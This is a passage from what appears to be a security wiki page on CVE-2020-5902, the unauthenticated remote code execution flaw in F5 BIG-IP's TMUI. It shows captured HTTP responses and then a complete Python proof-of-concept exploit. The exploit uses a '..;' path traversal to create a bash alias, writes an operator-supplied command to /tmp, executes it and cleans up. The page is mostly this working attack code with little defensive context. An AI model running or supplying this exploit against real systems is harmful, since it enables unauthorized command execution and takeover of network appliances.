<span class="na">X-Frame-Options</span><span class="o">:</span> <span class="l">SAMEORIGIN</span>
<span class="na">Strict-Transport-Security</span><span class="o">:</span> <span class="l">max-age=16070400; includeSubDomains</span>
<span class="na">Set-Cookie</span><span class="o">:</span> <span class="l">JSESSIONID=x; Path=/tmui; Secure; HttpOnly</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">text/html;charset=ISO-8859-1</span>
<span class="na">X-Content-Type-Options</span><span class="o">:</span> <span class="l">nosniff</span>
<span class="na">X-XSS-Protection</span><span class="o">:</span> <span class="l">1; mode=block</span>
<span class="na">Content-Security-Policy</span><span class="o">:</span> <span class="l">default-src &#39;self&#39;  &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; data: blob:; img-src &#39;self&#39; data:  http://127.4.1.1 http://127.4.2.1</span>
<span class="na">Vary</span><span class="o">:</span> <span class="l">Accept-Encoding</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">32</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>





{&quot;output&quot;:&quot;CVE-2020-5902\n&quot;}
</code></pre></div>

<h4 id="upload-tmp1txt-successful">upload /tmp/1.txt Successful ！<a class="headerlink" href="#upload-tmp1txt-successful" title="Permanent link">&para;</a></h4>
<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<p>6.png</p>
<div class="codehilite"><pre><span></span><code><span class="c1">#coding:utf-8</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests.packages.urllib3</span>
<span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">uuid</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>

<span class="c1"># tmshCmd.jsp?command=create+cli+alias+private+list+command+bash</span>
<span class="c1"># fileSave.jsp?fileName=/tmp/cmd&amp;content=id</span>
<span class="c1"># tmshCmd.jsp?command=list+/tmp/cmd</span>
<span class="c1"># tmshCmd.jsp?command=delete+cli+alias+private+list</span>

<span class="n">banner</span> <span class="o">=</span> <span class="sa">r</span><span class="s1">&#39;&#39;&#39;</span>
<span class="s1"> _______  _______    ______  _________ _______   _________ _______    _______  _______  _______ </span>
<span class="s1">(  ____ \(  ____ \  (  ___ \ \__   __/(  ____ \  \__   __/(  ____ )  (  ____ )(  ____ \(  ____     | (    \/| (    \/  | (   ) )   ) (   | (    \/     ) (   | (    )|  | (    )|| (    \/| (    \/</span>
<span class="s1">| (__    | (____    | (__/ /    | |   | |           | |   | (____)|  | (____)|| |      | (__    </span>
<span class="s1">|  __)   (_____ \   |  __ (     | |   | | ____      | |   |  _____)  |     __)| |      |  __)   </span>
<span class="s1">| (            ) )  | (  \ \    | |   | | \_  )     | |   | (        | (\ (   | |      | (      </span>
<span class="s1">| )      /\____) )  | )___) )___) (___| (___) |  ___) (___| )        | ) \ \__| (____/\| (____/    |/       \______/   |/ \___/ \_______/(_______)  \_______/|/         |/   \__/(_______/(_______/</span>

<span class="s1">                        CVE-2020-5902 UnAuth RCE Vuln</span>
<span class="s1">                            Python By Jas502n</span>
<span class="s1">From: https://github.com/rapid7/metasploit-framework/blob/0417e88ff24bf05b8874c953bd91600f10186ba4/modules/exploits/linux/http/f5_bigip_tmui_rce.rb</span>
<span class="s1">____________________________________________________________________________________________________________________________________________________</span>
<span class="s1">&#39;&#39;&#39;</span>

<span class="k">def</span><span class="w"> </span><span class="nf">tmshCmd_exit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">file</span><span class="p">,</span><span class="n">cmd</span><span class="p">):</span>
    <span class="n">tmshCmd_url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s2">&quot;/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash&quot;</span>
    <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;http&quot;</span><span class="p">:</span><span class="s2">&quot;http://127.0.0.1:8080&quot;</span><span class="p">,</span><span class="s2">&quot;https&quot;</span><span class="p">:</span><span class="s2">&quot;https://127.0.0.1:8080&quot;</span><span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">tmshCmd_url</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="c1"># r = requests.get(tmshCmd_url,verify=False,allow_redirects=False,proxies=proxies)</span>

    <span class="n">response_str</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;_store&#39;</span><span class="p">])</span>
    <span class="c1"># print type(response_str)</span>
    <span class="c1"># print response_str</span>
    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="s1">&#39;tmui&#39;</span> <span class="ow">in</span> <span class="n">response_str</span><span class="p">:</span>
        <span class="c1"># print tmshCmd_url</span>
        <span class="nb">print</span> <span class="s2">&quot;[+] tmshCmd.jsp Exit!&quot;</span>
        <span class="nb">print</span> <span class="s2">&quot;[+] create cli alias private list command bash </span><span class="se">\n</span><span class="s2">&quot;</span>
        <span class="c1"># cmd = &#39;whoami&#39;</span>
        <span class="n">upload_exit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">file</span><span class="p">,</span><span class="n">cmd</span><span class="p">)</span>


    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span> <span class="s2">&quot;[+] tmshCmd.jsp No Exit!</span><span class="se">\n</span><span class="s2">&quot;</span>

<span class="k">def</span><span class="w"> </span><span class="nf">upload_exit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">file</span><span class="p">,</span><span class="n">cmd</span><span class="p">):</span>
    <span class="n">fileSave_url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s2">&quot;/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/</span><span class="si">%s</span><span class="s2">&amp;content=&quot;</span><span class="o">%</span><span class="n">file</span> <span class="o">+</span> <span class="n">cmd</span>
    <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;http&quot;</span><span class="p">:</span><span class="s2">&quot;http://127.0.0.1:8080&quot;</span><span class="p">,</span><span class="s2">&quot;https&quot;</span><span class="p">:</span><span class="s2">&quot;https://127.0.0.1:8080&quot;</span><span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">fileSave_url</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="c1"># r = requests.get(fileSave_url,verify=False,allow_redirects=False,proxies=proxies)</span>
    <span class="n">response_str</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;_store&#39;</span><span class="p">])</span>
    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="s1">&#39;tmui&#39;</span> <span class="ow">in</span> <span class="n">response_str</span><span class="p">:</span>
        <span class="c1"># print fileSave_url</span>
        <span class="nb">print</span> <span class="s2">&quot;[+] fileSave.jsp Exit!</span><span class="se">\n</span><span class="s2">&quot;</span>
        <span class="n">list_command</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">file</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span> <span class="s2">&quot;[+] fileSave.jsp No Exit!</span><span class="se">\n</span><span class="s2">&quot;</span>

<span class="k">def</span><span class="w"> </span><span class="nf">list_command</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">file</span><span class="p">):</span>
    <span class="n">rce_url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s2">&quot;/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">file</span>
    <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;http&quot;</span><span class="p">:</span><span class="s2">&quot;http://127.0.0.1:8080&quot;</span><span class="p">,</span><span class="s2">&quot;https&quot;</span><span class="p">:</span><span class="s2">&quot;https://127.0.0.1:8080&quot;</span><span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">rce_url</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="c1"># r = requests.get(rce_url,verify=False,allow_redirects=False,proxies=proxies)</span>
    <span class="n">response_str</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;_store&#39;</span><span class="p">])</span>
    <span class="c1"># print len(r.content)</span>
    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="s1">&#39;tmui&#39;</span> <span class="ow">in</span> <span class="n">response_str</span><span class="p">:</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">33</span><span class="p">:</span>
            <span class="c1"># print rce_url</span>
            <span class="nb">print</span> <span class="s2">&quot;[+] Command Successfull !</span><span class="se">\n</span><span class="s2">&quot;</span>
            <span class="n">command_result</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
            <span class="nb">print</span> <span class="s2">&quot;_&quot;</span><span class="o">*</span><span class="mi">90</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\n\n</span><span class="s1">&#39;</span>
            <span class="nb">print</span> <span class="n">command_result</span><span class="p">[</span><span class="s1">&#39;output&#39;</span><span class="p">]</span>
            <span class="nb">print</span> <span class="s2">&quot;_&quot;</span><span class="o">*</span><span class="mi">90</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\n\n</span><span class="s2">&quot;</span>
            <span class="n">delete_list</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span> <span class="s2">&quot;[+] Command Failed !</span><span class="se">\n</span><span class="s2">&quot;</span>

<span class="k">def</span><span class="w"> </span><span class="nf">delete_list</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
    <span class="n">delete_url</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list&#39;</span>
    <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;http&quot;</span><span class="p">:</span><span class="s2">&quot;http://127.0.0.1:8080&quot;</span><span class="p">,</span><span class="s2">&quot;https&quot;</span><span class="p">:</span><span class="s2">&quot;https://127.0.0.1:8080&quot;</span><span class="p">}</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">delete_url</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="c1"># r = requests.get(delete_url,verify=False,allow_redirects=False,proxies=proxies)</span>
    <span class="n">response_str</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;_store&#39;</span><span class="p">])</span>
    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="s1">&#39;tmui&#39;</span> <span class="ow">in</span> <span class="n">response_str</span><span class="p">:</span>
        <span class="c1"># print delete_url</span>
        <span class="nb">print</span> <span class="s2">&quot;[+] delete cli alias private list Successfull! </span><span class="se">\n</span><span class="s2">&quot;</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span> <span class="s2">&quot;[+] delete cli alias private list Failed! </span><span class="se">\n</span><span class="s2">&quot;</span>






<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="nb">print</span> <span class="n">banner</span>
    <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;https://x.x.x.x/&quot;</span>
        <span class="c1"># url = sys.argv[1]</span>
        <span class="n">file</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid1</span><span class="p">())</span>
        <span class="nb">print</span> <span class="s2">&quot;/tmp/&quot;</span> <span class="o">+</span> <span class="n">file</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="n">raw_input</span><span class="p">(</span><span class="s2">&quot;[+]Set Cmd= &quot;</span><span class="p">)</span>
        <span class="nb">print</span>
        <span class="n">tmshCmd_exit</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">file</span><span class="p">,</span><span class="n">cmd</span><span class="p">)</span>
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../F5-BIG-IP/F5%20BIG-IP%20iControl%20REST%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2022-1388/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../F5-BIG-IP/F5%20BIG-IP%20iControl%20REST%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2022-1388/" class="btn btn-xs btn-link">
        F5 BIG-IP iControl REST身份认证绕过漏洞 CVE-2022-1388
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%28CVE-2021-22986%29%20F5%20BIG-IP%20iControl%20RCE/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%28CVE-2021-22986%29%20F5%20BIG-IP%20iControl%20RCE/" class="btn btn-xs btn-link">
        (CVE-2021-22986) F5 BIG-IP iControl RCE
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>